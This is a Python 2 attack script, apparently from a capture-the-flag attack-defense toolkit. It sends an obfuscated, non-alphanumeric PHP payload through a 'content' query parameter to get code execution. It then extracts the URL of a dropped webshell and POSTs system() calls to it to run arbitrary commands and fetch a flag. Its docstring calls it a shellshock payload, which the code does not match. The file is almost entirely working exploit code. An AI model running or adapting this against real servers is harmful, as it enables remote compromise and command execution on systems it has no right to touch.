#!/usr/bin/env python

from http import http
from config import *
from function import *

'''
this is the payload script for vuln shellshock

'''


def attack(target,target_port,cmd,get_flag):
    is_vuln = 1
    flag = "hello world!"
    info = "success"
    reserve = 0    
    if check_shell(target,target_port,""):
	res = execute_shell(target,target_port,cmd)
    else:
	dump_warning(target,"check_shell failed","function.py check_shell")
    try:
	res = http('get',target,target_port,"/?content=$_='';$_[%2b$_]%2b%2b;$_=$_.'';$__=$_[%2b''];$_=$__;$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____='_';$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$_=$$____;$___($_[_]);",'',{})
	print res 
    except Exception,e:
	dump_error(target,"attack failed","sample.py attack")
	res = "error"
	
    index_1 = res.find("href='") + 6
    index_2 = res.find("'>shell")
    shell_url = "/" + res[index_1:index_2]	
    print "[*]shell_url => " + shell_url
    try:	    
	data = "_=system('" + cmd + "')"
	res = http("post",target,target_port,shell_url,data,{})
	print len(res)
    except Exception,e:
	dump_error(target,"attack failed","sample.py attack")
	res = "error"
    if get_flag:
	if check_flag(res):
	    flag = res
	    print "flag => " + res.replace(" ","").replace("\n","")
	else:
	    dump_warning(target,"flag format error,you may need to rewrite the shell", "sample.py attack")
    elif res=="error":
	pass
    else:
	dump_success(target,"execution cmd","sample.py")
	if len(res)<200:
    	    print res
	else:
	    print res[:200]


    print "testing ..........."
    return flag,is_vuln,info,reserve 




